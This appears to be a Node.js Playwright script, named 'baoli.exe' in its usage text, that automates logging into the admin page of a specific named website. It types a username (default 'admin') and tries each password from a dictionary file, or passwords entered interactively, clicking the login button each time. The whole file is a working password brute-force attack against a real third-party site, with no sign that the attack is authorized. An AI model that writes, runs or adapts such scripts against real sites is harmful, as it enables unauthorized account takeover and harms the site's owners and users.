const { firefox } = require("playwright");
const getSource = require("get-source");
const readline = require("readline-sync");
const args = require("minimist")(process.argv.slice(1));

console.log(
  "Usage: \n\n1. baoli.exe\
\n\n2. baoli.exe --user admin1 -f /path/passwd_dict.txt\
\n\n3. baoli.exe -u admin2 -f /path/passwd_dict.txt\
\n\n4. baoli.exe -u admin3\
\n\n5. baoli.exe\n\n\n ########################################\n"
);

let file;
if (args.f) {
  file = getSource(args.f);
}

// console.log(file.lines);
(async () => {
  const browser = await firefox.launch({
    headless: false,
  });
  const context = await browser.newContext();
  const page = await context.newPage();
  await page.goto(
    "http://www.xj-itic.net/#/user/login?redirect=http%3A%2F%2Fwww.xj-itic.net%2F%23%2F"
  );
  await page.locator("html").click();
  await page.waitForSelector('[placeholder="请输入用户名"]');
  await page.waitForTimeout(1000 * 2);
  await page.locator('[placeholder="请输入用户名"]').click();
  const user = args.user || args.u || "admin";
  await page.locator('[placeholder="请输入用户名"]').fill(user);
  await page.locator('[placeholder="请输入用户名"]').press("Tab");
  await page.waitForSelector('[placeholder="请输入密码"]');
  await page.waitForTimeout(1000 * 2);

  if (file) {
    let lines = file.lines;
    for (l in lines) {
      let line = lines[l];
      if (line) {
        console.log("passwd" + l + " = ", line);
        await page.locator('[placeholder="请输入密码"]').fill(line);
        await page.locator('button:has-text("登 录")').click();
        await page.waitForTimeout(300);
      }
    }
  } else {
    while (true) {
      const passwd = readline.question("请输入您猜测的密码：");
      if (passwd) {
        if ("exit()" == passwd) {
          await context.close();
          await browser.close();
        }
        console.log("您输入的密码是：", passwd);
        await page.locator('[placeholder="请输入密码"]').fill(passwd);
        await page.locator('button:has-text("登 录")').click();
        await page.waitForTimeout(300);
      } else {
        console.log("密码不能为空");
      }
    }
  }
  // await page.locator("text=用户名或密码错误").click();
  // await context.close();
  // await browser.close();
})();
